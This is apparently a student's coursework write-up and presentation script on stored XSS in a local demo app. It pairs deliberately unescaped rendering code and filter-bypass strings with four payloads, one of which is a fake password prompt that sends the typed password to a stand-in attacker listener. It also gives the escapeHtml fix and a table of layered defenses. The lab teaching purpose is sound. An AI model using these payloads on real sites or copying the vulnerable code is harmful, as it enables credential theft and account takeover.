# Yashika — Cross-Site Scripting (Variant 1: Stored XSS)

## Member Details
- **Student Name:** Yashika
- **Roll Number:** IIT2024178
- **Course:** Cyber Security (IT-30001) | Autumn Semester 2026 | IIIT Allahabad
- **Instructor:** Dr. Soumyadev Maity
- **Vulnerability Category:** Cross-Site Scripting (XSS)
- **Variant Implemented:** Variant 1: Stored XSS (Persistent XSS)
- **Assigned Git Branch:** `yashika`
- **Application Module:** Community Wall (`/community`, `/comments`, `/yashika`)
- **Auxiliary Attacker Infrastructure:** External Listener on Port 4000 (`attacker-site.js`)

---

## 1. Comprehensive Theory for Viva Voce

### 1.1 What is Cross-Site Scripting (XSS)?
**Cross-Site Scripting (XSS)** is a client-side code injection vulnerability that occurs when a web application accepts untrusted data from an external entity and includes it in dynamic web responses without proper validation, filtering, or contextual output encoding.

This failure allows an attacker to inject malicious client-side scripts—predominantly **JavaScript**—into web pages served to other legitimate users. Because the script executes within the victim’s browser under the security context and domain origin of the target application (the **Same-Origin Policy** context), the browser implicitly trusts the code and grants it full access to:
- Document Object Model (DOM) of the host application
- Unprotected session storage, cookies, and local authentication tokens
- Network capabilities to issue authenticated requests on behalf of the victim

### 1.2 The Three Fundamental Archetypes of XSS
| Variant | Name | Mechanism | Propagation Vector | Threat Severity |
| :--- | :--- | :--- | :--- | :--- |
| **Type 1** | **Stored (Persistent) XSS** *(My Variant)* | The malicious payload is **permanently persisted** on the server’s storage layer (database, file system, in-memory collection). It is rendered automatically whenever any user loads the affected resource. | Organic application browsing (no interaction required). | **Critical / Highest**: Affects all visitors automatically. |
| **Type 2** | **Reflected (Non-Persistent) XSS** | The payload is embedded inside an immediate HTTP request (typically a search query or URL parameter) and bounced back in the immediate HTTP response without storage. | Phishing emails, malicious hyperlinks, social engineering. | **Medium / High**: Requires enticing the victim to click a weaponized link. |
| **Type 3** | **DOM-Based XSS** | The vulnerability exists entirely on the client side. Unsafe JavaScript sinks (e.g. `eval()`, `document.write()`, `innerHTML`) read from an untrusted source (e.g. `location.search`, `location.hash`) without server involvement. | Client-side URL parameters and hash routing. | **Medium / High**: Executes purely in the client-side execution environment. |

### 1.3 Why Stored XSS is the "King of XSS"
Stored XSS does not rely on deceiving a user into clicking a suspicious URL. An attacker submits the exploit once to a public or collaborative feature (a discussion forum, community board, user profile, or product review). 
Once stored on the server:
1. **Zero-Click Exploitation:** Every legitimate user who normally navigates to the page automatically executes the payload.
2. **Exponential Blast Radius:** A single post can compromise administrative accounts, staff members, and regular users simultaneously.
3. **Worm Capability (Samy Worm):** Stored XSS can be weaponized as a self-propagating worm: when a victim views the infected profile, the injected script silently sends requests to post the same payload onto the victim's profile, spreading across the entire platform exponentially.

### 1.4 The Fundamental Flaw: The In-Band Control Problem (Code vs. Data)
In computer science, security vulnerabilities like SQL Injection, OS Command Injection, and XSS all originate from the exact same architectural anti-pattern: **The In-Band Control Problem**.
- Web browsers use a single unified text stream (HTML) to represent both:
  1. **Structure and Logic (Code/Control Markup):** Tags like `<script>`, `<img>`, `<a>`, attributes like `onload`, `onerror`, `onclick`.
  2. **Content (User Data):** Text messages, usernames, descriptions, comments.
- An HTML parser tokenizes incoming characters sequentially. When it encounters `<` followed by tag characters, it transitions its internal state machine from **Data State** to **Tag Open / Tokenization State**.
- If an application concatenates user text directly into HTML templates without output encoding, the browser interpreter cannot determine the author's intent. It treats attacker-supplied data as executable control instructions.

### 1.5 Why Naive Defenses Fail (Filter Evasion & Bypass Techniques)
During viva voce, evaluators frequently ask: *"Why can't we simply remove `<script>` tags using a regex or blacklist?"*

Blacklists fail because HTML and JavaScript parsing is complex and flexible:
1. **Case-Insensitive Tag Variations:**
   `replace('<script>', '')` fails against `<sCrIpt>alert(1)</sCrIpt>`.
2. **Recursive / Nested Stripping Flaws:**
   A naive single-pass filter that deletes `<script>` converts `<scr<script>ipt>` into `<script>`!
3. **Execution Without `<script>` Tags:**
   Browsers support hundreds of inline event handlers:
   - `<img src="x" onerror="alert(1)">` (Fires on resource load failure)
   - `<svg onload="alert(1)">` (Fires on SVG document load)
   - `<body onload="alert(1)">`
   - `<input type="text" autofocus onfocus="alert(1)">`
4. **Attribute Breakouts:**
   If user data is reflected inside an attribute (e.g., `<input value="USER_DATA">`), entering `" onfocus="alert(1)` breaks out of the quote boundary without needing any `<` or `>` characters at all!

---

## 2. Vulnerable Implementation (Code Path in `server.js`)

The **Community Wall** module (`/community`) allows workspace collaborators to publish real-time messages and announcements.

### Vulnerable Source Code:
```javascript
// In-memory data store for community posts
const posts = [];

// Post submission handler
app.post('/community/:mode', (req, res) => {
  posts.unshift({
    mode: req.params.mode === 'secure-post' ? 'secure' : 'legacy',
    text: String(req.body.text || '')
  });
  res.redirect('/community');
});

// Community Wall rendering endpoint
app.get('/community', (_req, res) => res.send(shell('Community Wall', 'community', `
  ...
  <div class="list">
    ${posts.length ? posts.map(post => `
      <div class="row">
        <small>${post.mode === 'legacy' ? 'Legacy rendering' : 'Protected rendering'}</small><br>
        ${post.mode === 'legacy' ? post.text : escapeHtml(post.text)}
      </div>
    `).join('') : '<div class="notice">No workspace updates have been published.</div>'}
  </div>
`)));
```

### Architectural Flaw Analysis:
1. **Unsanitized Ingestion:** The endpoint `/community/legacy-post` extracts `req.body.text` directly without syntactic validation or structural inspection.
2. **Stateful Persistence:** The server prepends the raw payload to the `posts` array in server memory (`posts.unshift`).
3. **Unescaped Output Interpolation:** In line 509 of `server.js`, when `post.mode === 'legacy'`, the application utilizes a JavaScript template literal (`${post.text}`) to inject the raw stored string directly into the HTML response buffer sent to the browser.

---

## 3. Exploit Arsenal: Demonstrating Real-World Threat Impact

To present beyond a simple `alert()` box, our workspace demonstrates four escalating levels of real-world exploitation:

### Level 1: Proof-of-Concept Execution (Visual Verification)
```html
<img src="x" onerror="alert('Stored XSS Verified - Yashika')">
```
- **Mechanism:** The browser attempts to load an image from nonexistent path `"x"`. The resource loading error triggers the inline `onerror` event handler, popping up an alert modal proving arbitrary JavaScript execution.

### Level 2: Interface Defacement & Visual Hijacking
```html
<img src="x" onerror="document.body.style.backgroundColor='#3a0d15'; document.querySelector('h1').innerText='⚠️ WORKSPACE COMPROMISED BY ATTACKER';">
```
- **Mechanism:** The script uses the DOM API (`document.body.style`, `querySelector`) to override the application's CSS styles and modify user-facing headings, simulating website defacement or ransomware extortion banners.

### Level 3: Credential Harvesting via In-Band DOM Injection (Phishing)
```html
<div style="background:#1b2333;padding:16px;border:2px solid #ff7b91;border-radius:10px;margin-top:10px;">
  <h4 style="color:#ff7b91;margin:0 0 8px;">⚠️ Security Re-authentication</h4>
  <p style="color:#cbd6eb;margin:0 0 10px;">Your session has timed out. Enter master password:</p>
  <input id="stolenPass" type="password" placeholder="Master Password" style="width:200px;padding:6px;border-radius:6px;background:#0d1524;color:#fff;border:1px solid #3a5078;">
  <button onclick="fetch('http://localhost:4000/steal?pass=' + encodeURIComponent(document.getElementById('stolenPass').value)); alert('Credentials exfiltrated to attacker on Port 4000!');" style="margin-left:8px;padding:6px 12px;cursor:pointer;">Confirm</button>
</div>
```
- **Mechanism:** Injects an authentic-looking authentication modal. When the victim enters their password and clicks Confirm, the client-side script executes a background `fetch()` request sending the plaintext password to the external listener on **Port 4000** (`attacker-site.js`), where it is printed directly on the attacker's terminal.

### Level 4: Drive-By State Modification (Forced Background Action)
```html
<img src="x" onerror="fetch('/settings/legacy-update?email=attacker-yashika@evil.test'); alert('Account contact email hijacked silently!');">
```
- **Mechanism:** Leverages ambient authority. Because the JavaScript executes inside the victim's authenticated browser context, the browser automatically attaches the victim’s session cookie (`connect.sid`). The server processes the request as legitimate, silently changing the victim's account email without their consent.

---

## 4. Root Cause Statement

> **Root Cause:** Untrusted user input is persisted directly on the server and interpolated into dynamic HTML response templates without context-aware output encoding. The browser's HTML parser cannot distinguish legitimate application structure from attacker-supplied content, causing embedded HTML markup and JavaScript event handlers to be parsed and executed in the security context of the victim's origin.

---

## 5. Implemented Mitigation: Contextual HTML Entity Encoding

### How the Fix Works in `server.js`:
In the protected workflow (`/community/secure-post`), all output rendered in the HTML body is strictly passed through the `escapeHtml` transformation:

```javascript
function escapeHtml(value) {
  return String(value).replace(/[&<>'"]/g, char => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    "'": '&#39;',
    '"': '&quot;'
  })[char]);
}
```

### The Mechanism of HTML Entity Neutralization:
- When the browser's HTML tokenizer reads `&lt;` instead of `<`, the tokenizer remains in the **Character Data State**.
- It does **not** transition into **Tag Open State**.
- The browser instantiates a harmless text node (`TextNode`) containing the literal characters `<script>` or `<img ...>`, presenting the characters visually on screen while ensuring the JavaScript parsing engine is never invoked.

### Verification of Mitigation:
When submitting any Level 1–4 payload into `/community/secure-post`:
- No scripts execute.
- No popups trigger.
- No styles are altered.
- No credentials are stolen.
- Under *Recent updates*, the payload is rendered harmlessly as plain text. Viewing the raw page source (`Ctrl + U`) confirms the presence of `&lt;` and `&gt;`.

---

## 6. Comprehensive Defense-in-Depth Matrix (Viva Voce Preparation)

Defense-in-depth requires that no single security failure results in total application compromise:

| Defense Layer | Mechanism | Implementation | Failure Mode Protected Against |
| :--- | :--- | :--- | :--- |
| **Layer 1: Output Encoding** | Contextual HTML Entity Encoding | `escapeHtml(post.text)` | Primary defense against markup injection in HTML body context. |
| **Layer 2: Cookie Hardening** | `HttpOnly` Cookie Flag | `cookie: { httpOnly: true }` in `server.js` | Prevents theft of session credentials via `document.cookie` if an XSS flaw exists. |
| **Layer 3: Browser Security Policy** | Content Security Policy (CSP) | HTTP Header: `Content-Security-Policy: default-src 'self'` | Restricts inline scripts, `eval()`, and unauthorized external connections at the browser engine level. |
| **Layer 4: HTML Sanitization** | DOMPurify / sanitize-html | DOMPurify library parser | Used when rich-text formatting (`<b>`, `<i>`) is legitimately required by design. |
| **Layer 5: Modern UI Frameworks** | Virtual DOM Auto-Escaping | React JSX `{data}`, Angular `{{data}}` | Context-aware automatic escaping baked into the compilation pipeline. |

---

## 7. Professional Presentation Script (3–4 Minutes)

- **[0:00 - 0:40] Introduction & Theoretical Foundation:**
  - *"Good day. I am Yashika (IIT2024178). For Group 15's web security assignment, I implemented and evaluated Cross-Site Scripting, specifically Variant 1: Stored XSS, on our Sentinel Workspace Community Wall."*
  - *"Stored XSS represents the most critical class of injection vulnerabilities because the malicious script is persisted on the server, resulting in zero-click, automatic exploitation against every visiting user."*

- **[0:40 - 1:30] Vulnerability & Multi-Stage Exploit Demonstration:**
  - Open `http://localhost:3000/community`.
  - In the **Legacy workflow**, paste the credential harvesting payload:
    *(Show the fake authentication box appearing on the screen).*
  - Type a password into the fake box and click Confirm.
  - Switch to Terminal 2 (`npm run attacker` on Port 4000):
    *"As demonstrated on our external attacker listener on Port 4000, the injected script intercepted the user's password and exfiltrated it over the network in real time."*

- **[1:30 - 2:15] Root Cause Code Inspection:**
  - Switch to VS Code and show `server.js` line 509:
  - *"The root cause is unencoded template interpolation. When rendering `post.text` directly into the HTML response, the application suffers from the In-Band Control Problem: the browser cannot distinguish legitimate developer markup from attacker-supplied input."*

- **[2:15 - 3:00] Mitigation & Verification:**
  - Walk through the `escapeHtml` function.
  - Return to the browser and paste the exact same exploit into the **Protected workflow** card.
  - Click "Publish safely". Show that no phishing box or script executes.
  - Open **View Page Source** (`Ctrl + U`) to show `&lt;` and `&gt;` entities neutralizing the attack.

- **[3:00 - 3:30] Defense-in-Depth & Conclusion:**
  - *"In production architectures, we complement contextual encoding with defense-in-depth: enforcing HttpOnly flags on session cookies to mitigate session hijacking, deploying strict Content Security Policies, and using robust sanitizers like DOMPurify when rich text is required. Thank you."*
